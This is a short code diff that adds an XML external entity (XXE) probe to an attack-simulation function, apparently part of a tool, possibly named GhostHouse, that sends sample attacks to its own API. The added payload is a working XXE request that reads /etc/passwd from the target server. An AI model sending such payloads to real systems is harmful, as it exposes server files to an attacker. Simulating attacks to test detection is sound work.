@@ -187,6 +187,15 @@ export async function dispatchAttackProbe(attackType) {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
       },
     },
+    xxe: {
+      url: `${API_BASE_URL}/api/xml`,
+      method: 'POST',
+      body: '<?xml version="1.0" encoding="ISO-8859-1"?>\\n<!DOCTYPE foo [\\n<!ELEMENT foo ANY >\\n<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>\\n<foo>&xxe;</foo>',
+      headers: {
+        'Content-Type': 'application/xml',
+        'User-Agent': 'GhostHouse-XXE-Sim/1.0',
+      },
+    },
   }
 
   const selected = configs[attackType] || configs.sqli
